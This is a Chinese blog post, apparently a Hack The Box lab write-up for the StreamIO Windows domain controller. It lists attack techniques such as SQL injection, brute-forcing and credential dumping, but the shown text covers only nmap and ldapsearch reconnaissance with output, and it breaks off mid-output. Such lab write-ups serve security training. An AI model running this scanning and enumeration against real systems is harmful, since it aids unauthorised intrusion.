

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：MSSQL数据库SQL注入攻击、二级目录扫描、hydra登录表单爆破、PHP过滤器使用、配置文件敏感信息泄露、chisel工具端口转发、mssqlclient工具使用、crackmapexec密码验证枚举、sqlcmd命令查询数据库、Firefox密码文件搜集和密码解密、pyLAPS可用于检索LAPS密码、使用 PowerView 工具添加某用户到某组中、crack">
<meta property="og:type" content="article">
<meta property="og:title" content="StreamIO-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/04/11/StreamIO-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：MSSQL数据库SQL注入攻击、二级目录扫描、hydra登录表单爆破、PHP过滤器使用、配置文件敏感信息泄露、chisel工具端口转发、mssqlclient工具使用、crackmapexec密码验证枚举、sqlcmd命令查询数据库、Firefox密码文件搜集和密码解密、pyLAPS可用于检索LAPS密码、使用 PowerView 工具添加某用户到某组中、crack">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/8.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/9.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/10.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/11.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/12.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/13.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/14.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/15.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/16.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/17.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/18.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/19.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/20.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/21.png">
<meta property="og:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/22.png">
<meta property="article:published_time" content="2024-04-11T15:50:55.000Z">
<meta property="article:modified_time" content="2024-05-03T14:47:34.229Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/StreamIO-htb-writeup/1.png">
  
  
  
  <title>StreamIO-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我的开源工具列表</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/nuclei/" target="_self">
                    
                    <span>Nuclei命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="StreamIO-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-11 23:50" pubdate>
          2024年4月11日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          66k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          551 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">StreamIO-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：MSSQL数据库SQL注入攻击、二级目录扫描、hydra登录表单爆破、PHP过滤器使用、配置文件敏感信息泄露、chisel工具端口转发、mssqlclient工具使用、crackmapexec密码验证枚举、sqlcmd命令查询数据库、Firefox密码文件搜集和密码解密、pyLAPS可用于检索LAPS密码、使用 PowerView 工具添加某用户到某组中、crackmapexec获取ntds密码、使用ldapsearch来枚举ms-MCS-AdmPwd</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2022/09/17/htb-streamio.html</code></p>
<p>参考链接：<code>https://b0ysie7e.gitbook.io/articulos/write-up/hackthebox/2024-03-20-streamio</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.158</p>
<p>2、获取下开放端口情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -oG allports<br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-11 06:37 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span><br>Host is up (<span class="hljs-number">0.12</span>s latency).<br>Not shown: <span class="hljs-number">65518</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">443</span>/tcp   open  https<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49673</span>/tcp open  unknown<br><span class="hljs-number">49674</span>/tcp open  unknown<br><span class="hljs-number">49738</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">20.51</span> seconds<br>                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49738</span>,                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49738</span> -sC -sV --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-11 06:38 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span><br>Host is up (<span class="hljs-number">0.11</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain        Simple DNS Plus<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>|_http-title: IIS Windows Server<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-10</span> <span class="hljs-number">21</span>:<span class="hljs-number">35</span>:<span class="hljs-number">05</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">443</span>/tcp   open  ssl/http      Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-title: Not Found<br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-10</span>T21:<span class="hljs-number">36</span>:<span class="hljs-number">47</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-1</span>h03m12s from scanner time.<br>| ssl-cert: Subject: commonName=streamIO/countryName=EU<br>| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb<br>| Not valid before: <span class="hljs-number">2022</span><span class="hljs-number">-02</span><span class="hljs-number">-22</span>T07:<span class="hljs-number">03</span>:<span class="hljs-number">28</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-03</span><span class="hljs-number">-24</span>T07:<span class="hljs-number">03</span>:<span class="hljs-number">28</span><br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">636</span>/tcp   open  tcpwrapped<br><span class="hljs-number">3269</span>/tcp  open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49674</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49738</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>|_clock-skew: mean: <span class="hljs-number">-1</span>h03m13s, deviation: <span class="hljs-number">2</span>s, median: <span class="hljs-number">-1</span>h03m15s<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-10</span>T21:<span class="hljs-number">36</span>:<span class="hljs-number">17</span><br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">103.17</span> seconds<br><br></code></pre></td></tr></table></figure>

<p>3、根据端口开放情况，目标靶机是一个域控，那就简单的ldap协议枚举下信息吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ldapsearch -x -s base namingcontexts -H ldap:<span class="hljs-comment">//10.10.11.158</span><br><span class="hljs-meta"># extended LDIF</span><br>#<br># LDAPv3<br><span class="hljs-meta"># base <span class="hljs-string">&lt;&gt;</span> (default) with scope baseObject</span><br><span class="hljs-meta"># filter: (objectclass=*)</span><br><span class="hljs-meta"># requesting: namingcontexts </span><br>#<br><br><span class="hljs-meta">#</span><br><span class="hljs-meta">dn:</span><br>namingcontexts: DC=streamIO,DC=htb<br>namingcontexts: CN=Configuration,DC=streamIO,DC=htb<br>namingcontexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb<br>namingcontexts: DC=DomainDnsZones,DC=streamIO,DC=htb<br>namingcontexts: DC=ForestDnsZones,DC=streamIO,DC=htb<br><br><span class="hljs-meta"># search result</span><br>search: <span class="hljs-number">2</span><br>result: <span class="hljs-number">0</span> Success<br><br># numResponses: <span class="hljs-number">2</span><br># numEntries: <span class="hljs-number">1</span><br>                                                                                                                                                            <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ldapsearch -H ldap:<span class="hljs-comment">//10.10.11.158 -x -s base -b &#x27;&#x27; &quot;(objectClass=*)&quot; &quot;*&quot; +</span><br><span class="hljs-meta"># extended LDIF</span><br>#<br># LDAPv3<br><span class="hljs-meta"># base <span class="hljs-string">&lt;&gt;</span> with scope baseObject</span><br><span class="hljs-meta"># filter: (objectClass=*)</span><br><span class="hljs-meta"># requesting: * + </span><br>#<br><br><span class="hljs-meta">#</span><br><span class="hljs-meta">dn:</span><br>domainFunctionality: <span class="hljs-number">7</span><br>forestFunctionality: <span class="hljs-number">7</span><br>domainControllerFunctionality: <span class="hljs-number">7</span><br>rootDomainNamingContext: DC=streamIO,DC=htb<br>ldapServiceName: streamIO.htb:dc$@STREAMIO.HTB<br>isGlobalCatalogReady: TRUE<br>supportedSASLMechanisms: GSSAPI<br>supportedSASLMechanisms: GSS-SPNEGO<br>supportedSASLMechanisms: EXTERNAL<br>supportedSASLMechanisms: DIGEST-MD5<br>supportedLDAPVersion: <span class="hljs-number">3</span><br>supportedLDAPVersion: <span class="hljs-number">2</span><br>supportedLDAPPolicies: MaxPoolThreads<br>supportedLDAPPolicies: MaxPercentDirSyncRequests<br>supportedLDAPPolicies: MaxDatagramRecv<br>supportedLDAPPolicies: MaxReceiveBuffer<br>supportedLDAPPolicies: InitRecvTimeout<br>supportedLDAPPolicies: MaxConnections<br>supportedLDAPPolicies: MaxConnIdleTime<br>supportedLDAPPolicies: MaxPageSize<br>supportedLDAPPolicies: MaxBatchReturnMessages<br>supportedLDAPPolicies: MaxQueryDuration<br>supportedLDAPPolicies: MaxDirSyncDuration<br>supportedLDAPPolicies: MaxTempTableSize<br>supportedLDAPPolicies: MaxResultSetSize<br>supportedLDAPPolicies: MinResultSets<br>supportedLDAPPolicies: MaxResultSetsPerConn<br>supportedLDAPPolicies: MaxNotificationPerConn<br>supportedLDAPPolicies: MaxValRange<br>supportedLDAPPolicies: MaxValRangeTransitive<br>supportedLDAPPolicies: ThreadMemoryLimit<br>supportedLDAPPolicies: SystemMemoryLimitPercent<br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.319</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.801</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.473</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.528</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.417</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.619</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.841</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.529</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.805</span><br>supportedControl: <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113556</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.521</span><br>supportedControl: <span 